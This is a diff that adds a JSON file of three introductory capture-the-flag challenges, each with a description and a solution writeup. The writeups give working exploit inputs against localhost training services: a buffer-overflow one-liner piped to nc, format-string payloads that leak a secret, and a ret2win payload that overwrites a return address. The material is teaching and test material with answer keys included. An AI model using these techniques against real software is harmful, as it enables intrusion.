@@ -1,0 +1,14 @@
+{
+  "overflow": {
+    "description": "## Overflow 101\nA classic. A tiny vault program reads your password with `gets()` into a 16-byte buffer, and the variable `is_admin` sits right next to it.\n\n```\nnc localhost 9101\n```\n\nSend more than the buffer can hold and watch what happens. (The service simulates the program; it never runs your input.)",
+    "writeup": "## Overflow 101: writeup\n\n`password` is 16 bytes and `is_admin` is stored directly after it. `gets()` does not check length, so extra bytes spill into `is_admin` and make it non-zero.\n\n```\npython3 -c \"print('A'*20)\" | nc localhost 9101\n```\n\n17 to 24 characters overwrite `is_admin` and grant access. Much longer input also tramples the return address and crashes the program."
+  },
+  "format": {
+    "description": "## Format Fiasco\n```c\nchar buf[64];\nfgets(buf, sizeof buf, stdin);\nprintf(buf);   // what could go wrong?\n```\n\nThe format string is **yours**.\n\n```\nnc localhost 9102\n```",
+    "writeup": "## Format Fiasco: writeup\n\nBecause `printf(buf)` uses your input as the format string, `%p` walks the stack. Sending eight of them shows that argument 8 is a pointer into the data segment:\n\n```\n%p.%p.%p.%p.%p.%p.%p.%p\n```\n\n`%N$s` reads the string a pointer refers to, so:\n\n```\n%8$s\n```\n\nprints the secret. (`%s` on a plain integer crashes, which is how you tell pointers from values.)"
+  },
+  "ret2win": {
+    "description": "## Return Home\nNo shellcode, no tricks: the binary contains a function called `win()` that nobody calls. **Make the program return into it.**\n\n```\nnc localhost 9103\n```\n\nThe banner tells you where `win()` lives.",
+    "writeup": "## Return Home: writeup\n\nThe stack is `buf[32]`, then the saved frame pointer (8 bytes), then the return address, so the return address starts at offset 40. Pad 40 bytes and put the address of `win()` in little-endian after it:\n\n```\npython3 -c \"import sys; sys.stdout.buffer.write(b'A'*40 + (0x401196).to_bytes(8,'little') + b'\\n')\" | nc localhost 9103\n```\n\nWhen the function returns, it jumps to `win()` instead of back to `main`."
+  }
+}
